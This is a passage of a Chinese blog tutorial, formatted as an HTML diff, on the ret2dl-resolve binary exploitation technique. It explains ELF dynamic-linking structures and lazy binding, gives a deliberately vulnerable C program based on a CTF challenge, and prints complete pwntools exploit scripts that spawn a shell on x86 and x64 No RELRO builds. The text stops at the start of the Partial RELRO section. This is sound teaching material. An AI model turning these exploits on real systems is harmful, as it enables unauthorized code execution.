@@ -1,0 +1,1283 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/hacker.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Ret2dl-resolve," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="基础知识首先了解几个重要的section：  .dynamic：ld.so使用的动态链接信息。主要关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针。在IDA里面如下所示：  12345678910111213141516171819typedef struct&#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ret2dl-Resolve">
+<meta property="og:url" content="https://pursuezhou.github.io/2023/07/28/Pwn/Ret2dlresolve/index.html">
+<meta property="og:site_name" content="Pursue">
+<meta property="og:description" content="基础知识首先了解几个重要的section：  .dynamic：ld.so使用的动态链接信息。主要关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针。在IDA里面如下所示：  12345678910111213141516171819typedef struct&#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/17/xDBpuj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/17/xD0zvQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/17/xD0xgg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/17/xDBV8U.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/17/xDBnKJ.png">
+<meta property="article:published_time" content="2023-07-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-13T12:03:08.321Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="Ret2dl-resolve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/10/17/xDBpuj.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://pursuezhou.github.io/2023/07/28/Pwn/Ret2dlresolve/"/>
+
+
+
+
+
+  <title>Ret2dl-Resolve | Pursue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pursue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Better to light one candle than to curse the darkness.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://pursuezhou.github.io/2023/07/28/Pwn/Ret2dlresolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/wechat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pursue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Ret2dl-Resolve</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-07-28T00:00:00+08:00">
+                2023-07-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>首先了解几个重要的section：</p>
+<ol>
+<li><p><code>.dynamic</code>：ld.so使用的动态链接信息。<strong>主要关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</strong>。在IDA里面如下所示：</p>
+<p><img src="https://s1.ax1x.com/2022/10/17/xDBpuj.png" alt=".dynamic"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<span id="more"></span>
+
+<ol start="2">
+<li><p><code>.dynstr</code>：一个字符串表，保存了动态链接所需的字符串，index[0]的地方值始终为零，在后续我们需要用这些字符串的时候，<strong>取的都是这些字符串相对于节表头的偏移</strong>，在IDA里面如下图所示：</p>
+<p><img src="https://s1.ax1x.com/2022/10/17/xD0zvQ.png" alt=".dynstr"></p>
+</li>
+<li><p><code>.dynsym</code>：是一个符号表（结构体数组），该节保存了引用外部文件的符号，每一个结构体都对应一个符号，只能在运行时被解析，索引值从0开始计数，值为0的表项不具有实际的意义，表示未定义的符号，在IDA里面如下图所示：</p>
+<p><img src="https://s1.ax1x.com/2022/10/17/xD0xgg.png" alt=".dynsym"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">     Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span>	<span class="comment">// 相对于.dynstr 段头的偏移</span></span><br><span class="line">     Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">     Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span>			<span class="comment">// 一般函数为 0x12</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">     Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">   &#125; Elf32_Sym;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">     Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">     Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">     Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">     Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">   &#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> `.rel.plt`：一个重定位表（其中`.rela.plt`是函数的重定位表），重定位是连接符号定义与符号引用的过程，简单来说，重定位需要把节中的符号引用转换成这些符号在进程空间的虚拟地址，在IDA如下图所示：</span><br><span class="line"></span><br><span class="line">   ![.rel.plt](https:<span class="comment">//s1.ax1x.com/2022/10/17/xDBk5V.png)</span></span><br><span class="line"></span><br><span class="line">   ```c</span><br><span class="line">   <span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">   &#123;</span><br><span class="line">     Elf32_Addr	r_offset;		<span class="comment">/* Address */</span>	<span class="comment">// 保存解析后的符号地址写入内存的位置，一般指的就是 got</span></span><br><span class="line">     Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span>	</span><br><span class="line">       <span class="comment">// r_info 高3位用于标识该符号在 .dynsym 段中的位置，低位半字节对于函数来说一般是 0x7</span></span><br><span class="line">   &#125; Elf32_Rel;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">      Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">      whoever) gets their act together.  */</span></span><br><span class="line">   <span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">   &#123;</span><br><span class="line">     Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">     Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">   &#125; Elf64_Rel;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">   &#123;</span><br><span class="line">     Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">     Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">     Elf32_Sword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">   &#125; Elf32_Rela;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">   &#123;</span><br><span class="line">     Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">     Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">     Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">   &#125; Elf64_Rela;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>接下来了解一下延迟绑定的内容。延迟绑定的基本思想就是当函数第一次被调用时，动态链接器才进行符号查找、重定位等操作。如果未被调用则不进行绑定。ELF文件通过PLT和GOT的配合来实现延迟绑定，每个被调用的函数都有一组对应的PLT和GOT。</p>
+<p>PLT是位于代码段.plt节的一个数组，每个条目占8个字节，如下所示：</p>
+<ul>
+<li>PLT[0]：用于跳转到动态连接器</li>
+<li>PLT[1]：用于调用系统启动函数__libc_start_main()，main函数就是在这里被调用</li>
+<li>PLT[2]：从这里开始就是被调用函数的条目</li>
+</ul>
+<p>GOT是位于数据段.got.plt节的一个数组，每个条目占8个字节，如下所示：</p>
+<ul>
+<li>GOT[0]：动态链接器在解析函数地址时需要的地址<code>.dynamic</code>条目</li>
+<li>GOT[1]：动态链接器在解析函数地址时需要的地址<code>relor</code>条目</li>
+<li>GOT[2]：动态链接器ld-linux.so的入口点，即<code>_dl_runtime_resolve</code>函数</li>
+<li>GOT[3]：从这里开始就是被调用函数的条目</li>
+</ul>
+<p>以调用func函数为例：</p>
+<ol>
+<li>首先会进入func@plt，第一条指令jmp跳转到指定的GOT条目，如果没有重定位过，该位置保存的是func@plt的第二条指令。</li>
+<li>执行push指令，将对应的func在<code>.rel.plt</code>中的下标压栈（<strong>这里就是之后的reloc_index</strong>），然后进入PLT[0]。</li>
+<li>PLT[0]先将GOT[1]（一个<strong>link_map对象</strong>的地址）压栈，然后调用GOT[2]，即调用了<code>_dl_runtime_resolve()</code>函数。</li>
+</ol>
+<p>接下来就是动态解析的核心，<code>_dl_runtime_resolve()</code>函数：</p>
+<p><img src="https://s1.ax1x.com/2022/10/17/xDBV8U.png" alt="符号解析"></p>
+<p>这里附上E4L4师傅的流程图：</p>
+<p><img src="https://s1.ax1x.com/2022/10/17/xDBnKJ.png" alt="流程图"></p>
+<ol>
+<li>通过<code>link_map</code>访问<code>.dynamic</code>，并取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li>
+<li><code>.rel.plt</code>的地址与传入的<code>reloc_index</code>（<strong>注意是偏移</strong>）相加得到该函数的<code>Elf_Rel</code></li>
+<li>通过<code>Elf_Rel</code>结构体成员<code>r_info</code>的高位（<code>rel-&gt;r_info &gt;&gt; 8</code>）得到该函数在<code>.dynsym</code>的<strong>索引</strong>，由此得到该函数的<code>Elf_Sym</code></li>
+<li>通过<code>Elf_Sym</code>结构体成员<code>st_name</code>（<strong>注意是偏移</strong>）与<code>.dynstr</code>相加得到符号字符串的指针</li>
+</ol>
+<h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><p>编译采用的源码是仿照XDCTF2015的一道题写的，采用的编译器是gcc7，版本高于gcc9会减少gadget导致利用失败。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    </span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h3><p>在该种情况下.dynamic是可写的，只要修改其中的DT_STRTAB地址到我们伪造的.dynstr上，那么就可以实现任意函数的调用。</p>
+<h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z norelro -m32 pwn.c -o pwn-x86-norelro</span><br></pre></td></tr></table></figure>
+
+<p>EXP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn-x86-norelro&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-x86-norelro&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">strlen_push = elf.plt[<span class="string">&#x27;strlen&#x27;</span>] + <span class="number">6</span></span><br><span class="line">bss = elf.bss() + <span class="number">0x100</span></span><br><span class="line">fake_dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data().replace(<span class="string">b&#x27;strlen&#x27;</span>, <span class="string">b&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dt_strtab = <span class="number">0x08049804</span> + <span class="number">0x4</span></span><br><span class="line">ppp_r = <span class="number">0x08048629</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">pld += flat([read_plt, ppp_r, <span class="number">0</span>, bss, <span class="number">0x200</span>,</span><br><span class="line">             read_plt, strlen_push, <span class="number">0</span>, dt_strtab, <span class="number">0x10</span>])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.send(fake_dynstr)</span><br><span class="line">sh.send(p32(bss) + <span class="string">b&#x27;;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z norelro pwn.c -o pwn-x64-norelro</span><br></pre></td></tr></table></figure>
+
+<p>EXP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn-x64-norelro&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-x64-norelro&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">strlen_push = elf.plt[<span class="string">&#x27;strlen&#x27;</span>] + <span class="number">6</span></span><br><span class="line">bss = elf.bss() + <span class="number">0x100</span></span><br><span class="line">fake_dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data().replace(<span class="string">b&#x27;strlen&#x27;</span>, <span class="string">b&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dt_strtab = <span class="number">0x0000000000600988</span> + <span class="number">0x8</span></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000400773</span></span><br><span class="line">p_rsi_r15_r = <span class="number">0x0000000000400771</span></span><br><span class="line">ret = <span class="number">0x00000000004004c6</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">pld += flat([p_rdi_r, <span class="number">0</span>, p_rsi_r15_r, dt_strtab, <span class="number">0</span>, read_plt,</span><br><span class="line">             p_rdi_r, <span class="number">0</span>, p_rsi_r15_r, bss, <span class="number">0</span>, read_plt,</span><br><span class="line">             p_rdi_r, bss, ret, strlen_push])</span><br><span class="line"><span class="comment"># ret to avoid movaps xmmword ptr [rsp], xmm1</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.send(p64(bss + <span class="number">0x10</span>))</span><br><span class="line">sh.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + fake_dynstr)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>在该种情况下.dynamic是不可写的，不过我们可以控制reloc_index的值，使得我们可以伪造Elf_Rel结构体，进而可以通过r_info成员伪造Elf_Sym结构体，进而可以通过st_name成员找到我们伪造的字符串，最终实现任意函数调用。</p>
+<h4 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z lazy -m32 pwn.c -o pwn-x86-norelro</span><br></pre></td></tr></table></figure>
+
+<p>EXP如下：</p>
